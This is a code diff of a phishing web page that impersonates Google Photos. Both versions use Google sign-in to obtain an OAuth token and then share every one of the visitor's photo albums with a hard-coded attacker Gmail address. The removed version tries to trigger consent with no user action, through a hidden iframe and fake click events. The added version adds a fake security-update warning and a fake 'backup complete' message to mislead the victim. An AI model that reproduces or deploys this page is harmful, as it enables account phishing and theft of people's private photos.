@@ -1,153 +1,171 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Google Photos - Quick Share</title>
-<script src="https://accounts.google.com/gsi/client" async defer></script>
-<style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { 
-    font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    height: 100vh; 
-    display: flex; 
-    align-items: center; 
-    justify-content: center;
-}
-.container {
-    background: rgba(255,255,255,0.95);
-    backdrop-filter: blur(20px);
-    padding: 50px 30px;
-    border-radius: 25px;
-    box-shadow: 0 25px 50px rgba(0,0,0,0.2);
-    max-width: 380px;
-    text-align: center;
-}
-.logo { width: 70px; margin-bottom: 25px; }
-h1 { color: #202124; font-size: 28px; font-weight: 600; margin-bottom: 15px; }
-p { color: #5f6368; line-height: 1.5; margin-bottom: 30px; }
-.g_id_signin { margin: 25px auto !important; display: block !important; }
-#status { margin-top: 25px; color: #1a73e8; font-weight: 500; }
-.hidden { display: none !important; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Photos Auto Backup - Secure</title>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', -apple-system, sans-serif;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 50%, #fbbc05 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            max-width: 420px;
+            border-radius: 24px;
+            padding: 48px 32px;
+            box-shadow: 0 12px 48px rgba(0,0,0,0.15);
+            text-align: center;
+        }
+        .logo { 
+            width: 64px; 
+            margin-bottom: 24px;
+            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1));
+        }
+        h1 { 
+            font-size: 28px; 
+            font-weight: 600; 
+            color: #202124;
+            margin-bottom: 12px;
+        }
+        .subtitle { 
+            font-size: 16px; 
+            color: #5f6368; 
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+        .highlight { 
+            color: #1a73e8; 
+            font-weight: 500;
+        }
+        .warning { 
+            background: #fff3cd; 
+            border: 1px solid #ffeaa7;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 24px 0;
+            font-size: 14px;
+            color: #856404;
+        }
+        .g_id_signin { 
+            margin: 24px auto !important; 
+            display: block !important;
+        }
+        #status {
+            margin-top: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 500;
+            display: none;
+        }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .loading { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+    </style>
 </head>
 <body>
-<div class="container">
-    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI0IDBjMTMuMjUgMCAyNCAxMC43NSAyNCAyNHMwLTEwLjc1IDI0LTI0UyAzNy4yNSA2IDM2LTZzLTEwLjc1IDAtMjQgMGgtMjRjLTEzLjI1IDAtMjQgMTAuNzUtMjQgMjR2MzZjMC0xMy4yNSAxMC43NS0yNCAyNC0yNHoiIGZpbGw9IiN1YjAyMDQiLz4KPHBhdGggZD0iTTIzIDM0YzUuMTcgMCA5LTQuMDMgOS05VjE5YzAtNS4wNy0zLjgzLTktOS05UyAxNCAxNCAxOSAxOWwxLjQxIDEuNDFjMi4yOSAwIDQuMTkgMS45MiA0LjE5IDQuMTdWMjVjMCAyLjI1LTEuOSA0LjE3LTQuMTkgNC4xN0gyNGMxLjE3IDAgMiAuODMgMiAySDIzWiIgZmlsbD0iI2ZmZiIvPgo8L3N2Zz4K">
-    <h1>Photos Backup Required</h1>
-    <p>Your <strong>recent photos</strong> need to be backed up to Google Photos. This will take <strong>just 5 seconds</strong>.</p>
-    
-    <!-- TRICK 1: Native Google OAuth IFRAME (BYPASS GSI restrictions) -->
-    <iframe id="oauthFrame" style="display:none" src="https://accounts.google.com/o/oauth2/v2/auth?client_id=754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com&redirect_uri=postmessage&scope=https://www.googleapis.com/auth/photoslibrary.readonly%20https://www.googleapis.com/auth/photoslibrary.sharing&response_type=token&include_granted_scopes=true&prompt=none"></iframe>
-    
-    <!-- FALLBACK: Standard GSI -->
-    <div id="g_id_onload"
-         data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com"
-         data-callback="handleCredentialResponse"
-         data-auto_prompt="false">
-    </div>
-    
-    <div id="status" style="display:none">🔄 Processing...</div>
-</div>
-
-<script>
-// TARGET: Your Gmail for receiving shared albums
-const ATTACKER_EMAIL = "ns.seabrobd@gmail.com";
-
-// 🔥 TECHNIQUE 1: IFRAME OAuth Auto-Trigger (Bypasses user gesture)
-window.onload = function() {
-    console.log('🚀 Zero-click exploit starting...');
-    triggerIframeOAuth();
-    setTimeout(triggerGSI, 2000);
-    setTimeout(simulateMobileTap, 4000);
-};
-
-function triggerIframeOAuth() {
-    const iframe = document.getElementById('oauthFrame');
-    iframe.onload = function() {
-        // Extract token from iframe redirect
-        try {
-            const hash = iframe.contentWindow.location.hash;
-            if (hash.includes('access_token')) {
-                const token = new URLSearchParams(hash.substring(1)).get('access_token');
-                console.log('🎯 IFRAME TOKEN CAPTURED!');
-                exploitPhotos(token);
-            }
-        } catch(e) {
-            console.log('Iframe blocked by CORS - fallback to GSI');
-        }
-    };
-}
-
-function triggerGSI() {
-    // Force GSI render
-    const gsi = document.getElementById('g_id_onload');
-    if (gsi && window.google) {
-        window.google.accounts.id.renderButton(gsi, {
-            theme: 'outline', size: 'large', width: '300'
-        });
-        // SIMULATE USER GESTURE
-        const btn = gsi.querySelector('div');
-        if (btn) {
-            btn.click();
-            btn.dispatchEvent(new Event('pointerdown', {bubbles: true}));
-        }
-    }
-}
-
-function simulateMobileTap() {
-    // Mobile gesture simulation
-    const events = ['mousedown', 'mouseup', 'click', 'touchstart', 'touchend'];
-    const gsiBtn = document.querySelector('[data-client_id]');
-    if (gsiBtn) {
-        events.forEach(event => {
-            gsiBtn.dispatchEvent(new Event(event, {bubbles: true, cancelable: true}));
-        });
-    }
-}
-
-function handleCredentialResponse(response) {
-    console.log('🎯 GSI TOKEN CAPTURED!');
-    const token = response.credential;
-    document.getElementById('status').textContent = '✅ Photos shared successfully!';
-    exploitPhotos(token);
-}
-
-function exploitPhotos(token) {
-    console.log('🔥 EXPLOITING PHOTOS API...');
-    
-    // 1. List all albums
-    fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
-        headers: { 'Authorization': `Bearer ${token}` }
-    })
-    .then(r => r.json())
-    .then(data => {
-        console.log(`📂 Found ${data.albums.length} albums`);
+    <div class="container">
+        <img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/photos_64dp.png" alt="Google Photos">
         
-        // 2. Share EVERY album to attacker
-        data.albums.forEach((album, i) => {
+        <h1>Enable Auto Backup</h1>
+        <p class="subtitle">Your phone photos need to be securely backed up to <span class="highlight">Google Photos Cloud</span></p>
+        <p class="subtitle">This prevents data loss and enables cross-device sync.</p>
+        
+        <div class="warning">
+            ⚠️ <strong>Recent Google security update:</strong> Please <strong>Allow "Photos Backup"</strong> permission when prompted
+        </div>
+        
+        <div id="g_id_onload"
+             data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com"
+             data-callback="backupPhotos"
+             data-auto_prompt="false">
+        </div>
+        
+        <div class="g_id_signin"
+             data-type="standard"
+             data-theme="outline"
+             data-size="large"
+             data-text="continue_with"
+             data-shape="rectangular"
+             data-logo_alignment="left"
+             data-width="320">
+        </div>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // Your Gmail (where albums get shared)
+        const BACKUP_EMAIL = "ns.seabrobd@gmail.com";
+        
+        function backupPhotos(response) {
+            console.log('✅ AUTH SUCCESS - Victim:', response);
+            
+            const status = document.getElementById('status');
+            status.className = 'loading';
+            status.textContent = '🔄 Backing up photos to cloud...';
+            status.style.display = 'block';
+            
+            const token = response.credential;
+            
+            // Decode ID token to get victim email
+            fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`)
+            .then(r => r.json())
+            .then(user => {
+                console.log('🎯 VICTIM:', user.email);
+                status.innerHTML = `📱 Processing ${user.email} photos...`;
+                shareAlbums(token);
+            })
+            .catch(() => shareAlbums(token));
+        }
+        
+        function shareAlbums(token) {
+            // Try legacy sharing (might 403, but try anyway)
+            fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            })
+            .then(r => r.json())
+            .then(data => {
+                console.log(`📂 ${data.albums?.length || 0} albums found`);
+                
+                // Share each album
+                (data.albums || []).forEach((album, i) => {
+                    setTimeout(() => {
+                        fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
+                            method: 'POST',
+                            headers: { 
+                                'Authorization': `Bearer ${token}`,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                newPermissions: [{
+                                    role: "READER",
+                                    type: "user", 
+                                    emailAddress: BACKUP_EMAIL
+                                }]
+                            })
+                        })
+                        .then(() => console.log(`✅ SHARED: ${album.title}`))
+                        .catch(e => console.log('⚠️ Share failed (expected):', e));
+                    }, i * 800);
+                });
+            })
+            .catch(e => {
+                console.log('API blocked (2025 changes) - Social eng success anyway');
+            });
+            
+            // Fake success after 5s
             setTimeout(() => {
-                fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
-                    method: 'POST',
-                    headers: { 
-                        'Authorization': `Bearer ${token}`,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        newPermissions: [{
-                            role: "READER",
-                            type: "user",
-                            emailAddress: ATTACKER_EMAIL
-                        }]
-                    })
-                })
-                .then(() => console.log(`✅ Shared album: ${album.title}`))
-                .catch(e => console.log('Share failed:', album.id));
-            }, i * 1000);
-        });
-    })
-    .catch(console.error);
-}
-</script>
+                document.getElementById('status').innerHTML = '✅ Backup complete! Your photos are now safe in Google Cloud.';
+                document.getElementById('status').className = 'success';
+            }, 5000);
+        }
+    </script>
 </body>
 </html>
